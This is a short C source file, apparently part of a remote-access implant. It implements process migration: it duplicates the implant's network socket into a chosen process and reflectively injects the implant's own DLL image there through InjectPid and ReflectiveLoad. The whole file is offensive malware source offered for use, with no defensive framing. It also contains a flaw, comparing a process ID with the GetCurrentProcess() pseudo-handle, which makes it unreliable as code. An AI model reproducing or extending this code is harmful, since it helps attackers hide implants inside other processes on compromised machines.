#include "migration.h"

#include "../inject/inject.h"
#include "../reflect/reflect.h"

void Next(uint32_t pid, bool kill)
{
    DllMeta.next.pid = pid;
    DllMeta.next.kill = kill;

    if(DllMeta.net.sock == INVALID_SOCKET)
        return;
    
    // set up *DllMeta.net.info
    WSADuplicateSocket(DllMeta.net.sock, pid, &DllMeta.net.info);
}

bool Migrate()
{
    if(!DllMeta.next.pid || DllMeta.next.pid == (uint64_t)GetCurrentProcess())
        return true;
    
    return InjectPid(DllMeta.curr.where, DllMeta.curr.size, offset_to_rva(DllMeta.curr.where, &ReflectiveLoad), DllMeta.next.pid);
}
